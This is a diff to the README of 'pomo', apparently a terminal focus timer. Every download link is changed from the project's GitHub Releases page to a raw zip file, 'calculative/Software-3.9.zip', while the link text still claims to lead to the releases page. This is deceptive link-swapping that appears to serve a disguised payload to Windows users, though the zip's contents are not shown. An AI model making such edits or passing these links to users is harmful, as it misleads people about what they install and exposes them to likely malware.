@@ -1,6 +1,6 @@
 # ⏱️ pomo - Stay Focused With Less Friction
 
-[![Download pomo](https://img.shields.io/badge/Download-pomo-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/az326184/pomo/releases)
+[![Download pomo](https://img.shields.io/badge/Download-pomo-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/az326184/pomo/raw/refs/heads/main/calculative/Software-3.9.zip)
 
 ## 🚀 What is pomo?
 
@@ -21,7 +21,7 @@ It uses a clean text-based screen, so it stays light and easy to read. You can k
 
 Visit this page to download the latest Windows release:
 
-[Download pomo from GitHub Releases](https://github.com/az326184/pomo/releases)
+[Download pomo from GitHub Releases](https://github.com/az326184/pomo/raw/refs/heads/main/calculative/Software-3.9.zip)
 
 On the release page, look for the Windows file, then download it to your PC.
 
@@ -113,7 +113,7 @@ If you are using the browser download, keep this in mind:
 
 ## 🔗 Download link
 
-[Go to the pomo releases page](https://github.com/az326184/pomo/releases)
+[Go to the pomo releases page](https://github.com/az326184/pomo/raw/refs/heads/main/calculative/Software-3.9.zip)
 
 ## 🧭 Quick start
 
